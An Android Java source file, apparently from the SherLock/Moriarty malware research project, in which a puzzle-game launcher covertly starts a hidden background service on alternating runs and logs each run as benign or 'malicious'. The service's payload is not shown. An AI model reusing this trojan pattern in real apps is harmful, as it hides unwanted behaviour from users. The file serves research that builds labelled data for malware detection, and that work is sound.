package com.bgu.sherlock.Moriarty;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import androidx.core.app.TaskStackBuilder;

import android.util.Log;
import com.bgu.sherlock.Moriarty.moriartyUtils.Clues;
import com.bgu.sherlock.Moriarty.moriartyUtils.MoriaryService;

public class SGTPuzzles extends Activity {
    public static Long startTime;
    public static Boolean isEvil;
    public static String version;
    public static Integer sessionID;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        startTime = System.currentTimeMillis();
        PackageInfo pInfo = null;
        try {
            pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        version = pInfo.versionName;
        amIEvil(getApplicationContext());
        sessionID = getApplicationContext().getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE).getInt("session_id",-1);
        getApplicationContext().getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE).edit().putInt("session_id", sessionID + 1).commit();
        sessionID = sessionID+1;
        Log.e(SGTPuzzles.class.toString(),sessionID.toString());
        Clues clue = new Clues();
        clue.SendLog("Application started", "Application entered onCreate()");
        Long time = 1447573376113L;
        super.onCreate(savedInstanceState);
        if (isEvil) {
            Intent i = new Intent(this, MoriaryService.class);
            clue.SendLog("Moriarty start", "starting Moriarty's intent service" ,"malicious");
            startService(i);
        }
        final Intent intent = getIntent();
        intent.setClass(this, GamePlay.class);
        TaskStackBuilder.create(this)
                .addNextIntentWithParentStack(intent)
                .startActivities();
        finish();
    }

    public static Boolean amIEvil(Context appContext) {
        if (isFirstRun(appContext)) {
            return isEvil;
        }
        isEvil = appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE).getBoolean("isevil", true);
        if (!isEvil) {
            appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("isevil", true)
                    .commit();
            return isEvil = true;
        } else {
            appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("isevil", false)
                    .commit();
            return isEvil = false;
        }
    }

    public static long StartTime() {
        return startTime;
    }

    static public boolean isFirstRun(Context appContext) {
        boolean firstrun = appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE).getBoolean("firstrun", true);
        if (firstrun) {
            // Save the state
            appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("firstrun", false)
                    .commit();
            double rand = Math.random();
            Log.e(SGTPuzzles.class.toString(), "Rand num is:" + rand);
            if (rand > 0.5) {
                appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("isevil", true)
                        .commit();
                isEvil = true;
            } else {
                appContext.getSharedPreferences("PREFERENCE", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("isevil", false)
                        .commit();
                isEvil = false;
            }
        }
        return firstrun;
    }
}
